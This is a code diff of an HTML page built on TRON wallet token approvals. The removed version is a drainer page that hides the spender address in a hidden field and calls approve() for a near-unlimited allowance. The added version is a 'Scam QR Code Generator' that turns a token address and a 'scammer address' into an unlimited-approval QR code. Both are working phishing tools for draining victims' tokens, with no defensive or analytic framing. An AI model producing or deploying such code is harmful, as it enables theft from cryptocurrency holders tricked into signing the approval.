@@ -1,12 +1,15 @@
+
+```html
 <!doctype html>
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>TRC20 Token Approval</title>
+    <title>Generate Scam QR Code Example</title>
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.4/dist/TronWeb.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+    
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
+    
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -19,7 +22,7 @@
             padding: 10px;
             margin-bottom: 10px;
             border-radius: 5px;
-            border: none;
+            border: 1px solid #ccc;
         }
         button {
             background: #2f6bff;
@@ -28,66 +31,48 @@
         }
         #qrcode {
             margin-top: 20px;
-            text-align: center;
-        }
-        .hidden {
-            display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Token Approval</h1>
-    <input type="text" id="tokenAddress" placeholder="Token Contract Address" value="TJh8z4L8nijXEek9jtyra5oksRLQht7Crq" readonly />
-    <input type="text" id="ownerAddress" placeholder="Owner Wallet Address" value="TScqkJ6gDMEYHpW39G2evGEYt1u3PEeafb" readonly />
-    <input type="text" id="spenderAddress" class="hidden" value="THN9TLyQ1qjXvhvwSoneYwz88yTgnr9Zx4" />
-    <input type="number" id="amount" class="hidden" value="0" readonly />
-    <button id="approveBtn">Approve Tokens</button>
-    <div id="message" class="hidden"></div>
-    <div id="qrcode" class="hidden"></div>
+
+    <h1>Scam QR Code Generator</h1>
+    <input type="text" id="tokenAddress" placeholder="Enter TRC20 Token Address" />
+    <input type="text" id="scammerAddress" placeholder="Enter Scammer Address" />
+    <button id="generateButton">Generate QR Code</button>
+    
+    <div id="qrcode"></div>
 
     <script>
-        window.onload = async () => {
-            if (!window.TronWeb || !window.TronWeb.defaultAddress.base58) {
-                console.error('Please install TronLink and ensure you are connected to Mainnet.');
+        const generateScamRQCode = (tokenAddress, scammerAddress) => {
+            // Format the data for a QR code
+            const qrData = `tron:${tokenAddress}/approve?spender=${scammerAddress}&amount=999999999999999999999999999999`;
+            
+            // Clear previous QR code
+            $('#qrcode').empty();
+
+            // Generate a new QR code
+            const qrCode = new QRCode(document.getElementById("qrcode"), {
+                text: qrData,
+                width: 256,
+                height: 256,
+            });
+
+            console.log(`QR Code Data: ${qrData}`);
+        };
+
+        document.getElementById('generateButton').addEventListener('click', function() {
+            const tokenAddress = document.getElementById('tokenAddress').value;
+            const scammerAddress = document.getElementById('scammerAddress').value;
+
+            if (!tokenAddress || !scammerAddress) {
+                alert("Please fill in all fields.");
                 return;
             }
 
-            const approveTokens = async () => {
-                const tokenAddress = document.getElementById('tokenAddress').value;
-                const ownerAddress = document.getElementById('ownerAddress').value;
-                const spenderAddress = document.getElementById('spenderAddress').value;
-
-                try {
-                    const tronWeb = window.TronWeb;
-
-                    if (tronWeb.fullNode.host.includes('shasta')) {
-                        throw new Error("You are connected to the Testnet. Please switch to Mainnet.");
-                    }
-
-                    const contract = await tronWeb.contract().at(tokenAddress);
-                    await contract.approve(spenderAddress, "1000000000000000000000000000").send({
-                        from: ownerAddress
-                    });
-
-                    // ✅ QR generate karega jo सिर्फ Approve popup लाएगा
-                    generateQRCode(tokenAddress, ownerAddress, spenderAddress);
-
-                    setTimeout(() => {
-                        alert("Approval granted: Unlimited tokens from " + ownerAddress + " to " + spenderAddress);
-                    }, 1000);
-                } catch (error) {
-                    console.error("Error during approval:", error);
-                }
-            };
-
-            // ✅ Final QR (Only Approve USDT popup)
-            const generateQRCode = (tokenAddress, ownerAddress, spenderAddress) => {
-                const qrData = `tron:${tokenAddress}/approve?spender=${spenderAddress}&amount=1000000000000000000000000000`;
-                $('#qrcode').empty().qrcode(qrData).removeClass("hidden");
-            };
-
-            document.getElementById('approveBtn').onclick = approveTokens;
-        };
+            generateScamRQCode(tokenAddress, scammerAddress);
+        });
     </script>
 </body>
-  </html>
+</html>
+```
